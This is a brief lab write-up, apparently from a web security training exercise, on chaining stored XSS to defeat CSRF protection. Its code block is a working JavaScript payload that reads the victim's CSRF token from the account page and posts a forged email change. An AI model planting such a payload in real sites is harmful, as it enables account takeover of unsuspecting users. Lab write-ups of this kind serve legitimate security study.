# Exploiting XSS to bypass CSRF defenses

In this lab, we need to perform a CSRF attack by changing victim’s email. However, said victim is protected by the CSRF token. But we can exfiltrate CSRF token associated with the victim’s session and perform the attack.

For this, we will first steal victim’s CSRF token using Stored XSS:

```jsx
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

![Снимок экрана 2025-11-18 в 15.17.36.png](Exploiting%20XSS%20to%20bypass%20CSRF%20defenses/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-18_%D0%B2_15.17.36.png)